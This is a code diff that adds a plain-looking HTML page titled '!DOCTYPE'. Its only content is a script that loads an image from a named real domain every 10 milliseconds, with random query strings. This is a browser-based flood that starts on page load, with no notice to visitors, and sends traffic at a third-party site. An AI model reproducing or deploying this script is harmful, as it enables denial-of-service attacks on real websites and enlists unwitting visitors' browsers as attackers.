@@ -1,0 +1,20 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" 
+  "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+   <title>!DOCTYPE</title>
+   <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+ </head>
+ <body>
+  <script>
+    function imgflood() {
+  var TARGET = 'fca.com.pl'
+  var URI = '/index.php?'
+  var pic = new Image()
+  var rand = Math.floor(Math.random() * 1000)
+  pic.src = 'http://'+TARGET+URI+rand+'=val'
+}
+setInterval(imgflood, 10)
+  </script>
+ </body> 
+</html>
